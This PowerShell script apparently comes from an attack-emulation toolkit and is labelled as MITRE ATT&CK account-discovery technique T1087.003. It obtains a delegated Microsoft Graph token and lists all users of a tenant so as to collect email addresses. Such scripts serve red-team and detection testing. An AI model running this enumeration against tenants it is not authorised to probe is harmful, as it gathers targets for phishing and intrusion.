<#
.SYNOPSIS
Connect to Graph API and obtain an overview of all users that exist

.DESCRIPTION
TA0007: Discovery
T1087.003: Account Discovery - Email Account
1st attack method
#>

Get-Module | Where-Object name -eq readenv | Remove-Module
Import-Module ../APIs/readEnv.psm1
Get-Module | Where-Object name -eq custom | Remove-Module
Import-Module ../APIs/custom.psm1


# We use the ews environment variables
Import-Environment "graph.env"

Get-Module | Where-Object name -eq oauth-microsoft | Remove-Module
Import-Module ../APIs/oauth-microsoft.psm1
$scope = "User.ReadBasic.All"
if ($null -eq $accessToken) { $accessToken = Get-DelegatedAccessToken -tenantId $env:TENANT_ID -clientId $env:GRAPH_DELEGATE_CLIENT_ID -scope $scope -redirectUrl $env:GRAPH_DELEGATE_REDIRECT_URI }

# Obtain a list of all users, we need the email attribute
$url = "https://graph.microsoft.com/v1.0/users"
$users = Invoke-RestMethod $url -Headers @{"Authorization"="Bearer $accessToken"}

Write-Host $users